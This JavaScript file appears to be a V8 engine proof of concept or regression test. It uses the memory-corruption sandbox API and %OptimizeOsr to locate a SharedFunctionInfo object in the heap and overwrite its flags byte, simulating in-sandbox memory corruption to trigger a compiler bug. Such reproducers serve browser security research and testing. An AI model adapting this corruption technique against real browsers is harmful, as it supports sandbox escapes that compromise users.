let sbx_memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
Sandbox.getAddressOf(sbx_memory);

for (let v0 = 0; v0 < 5; v0++) {
    ("t9e").localeCompare("t9e");
    print();
    print();
    print();
    const v3 = % OptimizeOsr();
    print();
    print();

    start_addr = 0x19c317;
    while (true) {
        let map = sbx_memory.getUint32(start_addr, true);
        let flags2 = sbx_memory.getUint8(start_addr + 31, true);
        // look for the SharedFunctionInfo
        if (map == 0x00000d31 && flags2 == 0x50) {
            print("found: 0x" + start_addr.toString(16));
            break;
        }
        start_addr -= 1;
    }

    // set flags2 of SharedFunctionInfo
    sbx_memory.setUint8(start_addr + 31, 0x70);
}
